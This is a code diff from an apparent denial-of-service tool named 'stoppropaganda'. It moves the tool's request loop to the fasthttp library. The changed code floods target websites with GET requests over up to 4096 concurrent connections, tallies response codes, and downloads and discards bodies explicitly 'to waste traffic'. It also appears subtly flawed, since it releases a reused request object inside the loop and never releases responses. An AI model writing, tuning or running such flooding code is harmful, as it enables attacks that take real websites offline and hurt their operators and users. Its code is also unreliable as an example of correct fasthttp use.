@@ -1,13 +1,13 @@
 package stoppropaganda
 
 import (
-	"io"
 	"io/ioutil"
-	"net/http"
 	"net/url"
 	"strings"
 	"sync"
 	"time"
+
+	"github.com/valyala/fasthttp"
 )
 
 // Source: https://twitter.com/FedorovMykhailo/status/1497642156076511233
@@ -274,18 +274,32 @@ type Website struct {
 }
 
 func (ws *Website) Start(endpoint string) {
+	// Extract domain out of address
 	websiteURL, err := url.Parse(endpoint)
 	if err != nil {
 		panic(err)
 	}
 
-	// Create request
-	req, err := http.NewRequest("GET", endpoint, nil)
-	if err != nil {
-		panic(err)
+	// Create HTTP client
+	httpClient := &fasthttp.Client{
+		ReadTimeout:                   *flagTimeout,
+		WriteTimeout:                  *flagTimeout,
+		MaxIdleConnDuration:           time.Hour,
+		NoDefaultUserAgentHeader:      true,
+		DisableHeaderNamesNormalizing: true,
+		DisablePathNormalizing:        true,
+		Dial: (&fasthttp.TCPDialer{
+			Concurrency:      4096,
+			DNSCacheDuration: 5 * time.Minute,
+		}).Dial,
 	}
 
-	// Set headers
+	// Create request
+	req := fasthttp.AcquireRequest()
+	req.SetRequestURI(endpoint)
+	req.Header.SetMethod(fasthttp.MethodGet)
+
+	// Set request headers
 	req.Header.Set("Host", websiteURL.Host)
 	req.Header.Set("User-Agent", *flagUserAgent)
 	req.Header.Set("Accept", "*/*")
@@ -343,7 +357,8 @@ func (ws *Website) Start(endpoint string) {
 			ws.pauseMux.Unlock()
 
 			// Perform request
-			resp, err := httpClient.Do(req)
+			resp := fasthttp.AcquireResponse()
+			err := httpClient.Do(req, resp)
 			if err != nil {
 				ws.mux.Lock()
 				ws.Requests++
@@ -361,25 +376,27 @@ func (ws *Website) Start(endpoint string) {
 				ws.mux.Unlock()
 				continue
 			}
+			responseCode := resp.StatusCode()
 
 			// Increase counters
 			ws.mux.Lock()
 			ws.Requests++
-			if resp.StatusCode < 200 {
+			switch {
+			case responseCode < 200:
 				ws.Counter_code100++
-			} else if resp.StatusCode < 300 {
+			case responseCode < 300:
 				ws.Counter_code200++
-			} else if resp.StatusCode < 400 {
+			case responseCode < 400:
 				ws.Counter_code300++
-			} else if resp.StatusCode < 500 {
+			case responseCode < 500:
 				ws.Counter_code400++
-			} else {
+			default:
 				ws.Counter_code500++
 			}
 			ws.mux.Unlock()
 
 			// Download (and discard) response body to waste traffic
-			_, err = io.Copy(ioutil.Discard, resp.Body)
+			err = resp.BodyWriteTo(ioutil.Discard)
 			if err != nil {
 				ws.mux.Lock()
 				ws.Errors++
@@ -393,7 +410,7 @@ func (ws *Website) Start(endpoint string) {
 				}
 				ws.mux.Unlock()
 			}
-			resp.Body.Close()
+			fasthttp.ReleaseRequest(req)
 		}
 	}
 
